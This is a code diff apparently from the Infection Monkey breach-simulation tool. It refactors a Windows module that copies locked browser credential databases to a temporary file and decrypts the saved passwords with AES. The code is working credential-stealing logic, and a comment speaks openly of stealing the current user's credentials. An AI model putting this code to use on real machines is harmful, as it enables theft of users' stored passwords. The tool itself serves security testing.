@@ -1,7 +1,6 @@
 import logging
 import shutil
 import sqlite3
-import string
 import tempfile
 from pathlib import Path
 from typing import Collection, List, Optional, Tuple
@@ -10,7 +9,6 @@ from Cryptodome.Cipher import AES
 
 from common.credentials import Credentials, EmailAddress, Password, Username
 from common.types import Event
-from common.utils.code_utils import secure_generate_random_string
 from infection_monkey.utils.threading import interruptible_iter
 
 from .browser_credentials_database_path import BrowserCredentialsDatabasePath
@@ -26,22 +24,22 @@ class WindowsCredentialsDatabaseProcessor:
         credentials = []
 
         for item in interruptible_iter(database_paths, interrupt):
-            database_path = item.database_file_path
-            master_key = item.master_key
+            with tempfile.NamedTemporaryFile() as temporary_database_file:
+                temporary_database_path = Path(tempfile.gettempdir()) / temporary_database_file.name
 
-            # copy database before querying it to bypass lock errors
-            temporary_database_path = self._copy_database(database_path)
-            if temporary_database_path:
+                # copy database before querying it to bypass lock errors
+                with open(item.database_file_path, "rb") as database_file:
+                    shutil.copyfileobj(database_file, temporary_database_file)
+
                 try:
                     credentials.extend(
                         self._extract_credentials(
-                            temporary_database_path=temporary_database_path, master_key=master_key
+                            temporary_database_path=temporary_database_path,
+                            master_key=item.master_key,
                         )
                     )
                 except Exception as err:
                     logger.debug(f"{err}")
-
-                self._remove_temporary_database(temporary_database_path)
 
         return [
             Credentials(
@@ -57,36 +55,6 @@ class WindowsCredentialsDatabaseProcessor:
             return EmailAddress(email_address=user)
         except ValueError:
             return Username(username=user)
-
-    def _copy_database(self, database_path: Path) -> Optional[Path]:
-        root_dir = [
-            tempfile.gettempdir(),
-            # NOTE: (This is not relevant ATM since we only steal credentials from
-            # the current user, but leave this comment here for future reference.)
-            # Using user tempfile will produce an error when impersonating users
-            # (permission denied). Use a public directory in that case (uncomment the following):
-            # os.environ.get("PUBLIC", None),
-            # os.environ.get("SystemDrive", None) + "\\",
-        ]
-        random_name = secure_generate_random_string(n=9, character_set=string.ascii_lowercase)
-
-        for r in root_dir:
-            try:
-                temp_path = Path(r) / Path(random_name)
-                shutil.copy(database_path, temp_path)
-
-                logger.debug(
-                    f'Copied database at "{database_path}" to temporary location "{temp_path}"'
-                )
-
-                return temp_path
-            except Exception as err:
-                logger.error(
-                    "Encountered an exception while trying to copy database "
-                    f'at "{database_path}" to temporary location "{temp_path}": {err}'
-                )
-
-        return None
 
     def _extract_credentials(
         self, temporary_database_path: Path, master_key: Optional[bytes] = None
@@ -157,12 +125,3 @@ class WindowsCredentialsDatabaseProcessor:
         decrypted_password = decrypted_password[:-16].decode()  # remove suffix bytes
 
         return decrypted_password
-
-    def _remove_temporary_database(self, temporary_database_path: Path):
-        try:
-            temporary_database_path.unlink()
-            logger.debug(f'Removed temporary database file located at "{temporary_database_path}"')
-        except FileNotFoundError:
-            logger.error(
-                f'Could not remove temporary database file located at "{temporary_database_path}"'
-            )
